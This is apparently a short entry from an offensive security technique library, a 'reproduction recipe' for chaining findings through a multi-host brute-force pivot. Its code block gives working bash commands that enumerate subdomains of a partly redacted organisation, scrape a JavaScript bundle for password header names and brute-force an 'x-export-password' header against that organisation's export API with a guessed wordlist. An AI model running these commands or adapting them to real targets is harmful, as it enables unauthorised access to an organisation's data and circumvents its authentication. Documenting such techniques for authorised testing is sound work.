# Reproduction Recipe — chain composition

- source canon: `holyshit-mode/recon-technique-multi-host-brute.md`
- base technique: `holyshit-mode-recon-technique-multi-host-brute-reproduction-.md`
- chain role: **pivot — this BRIDGES a chain: an entry finding upstream plus this pivot plus a final downstream**

## Chain roles

- pivot — this BRIDGES a chain: an entry finding upstream plus this pivot plus a final downstream

## Pairing rule

chain detect pairs same-origin findings (the `_origin()` key: scheme + netloc). This technique composes when a sibling finding shares that origin and the pattern's two legs match. Never invent a chain: both legs need their own baseline→attack→diff proof first.

## Composition

```bash
# 1. Discover hosts (DNS + TLS SAN)
echo -e "api\ndoc\ninternal\nstatus\nstaging" | while read s; do host $s.f***REDACTED***.org; done
openssl s_client -connect f***REDACTED***.org:443 -servername f***REDACTED***.org < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# 2. Mine JS bundle for password headers
curl -s https://doc.f***REDACTED***.org | grep -oP 'x-[a-z]+-password'

# 3. Brute-force (no rate limit → full speed)
for p in admin password f***REDACTED*** openinfra madsys harvard seal; do
  curl -s -H "x-export-password: $p" "https://openinfra.f***REDACTED***.org/api/export?days=30" | head -c 100
done
```

## Walls

- a chain is a SEVERITY judgment over proven findings — never new execution
- every leg keeps its own ledger row and its own evidence
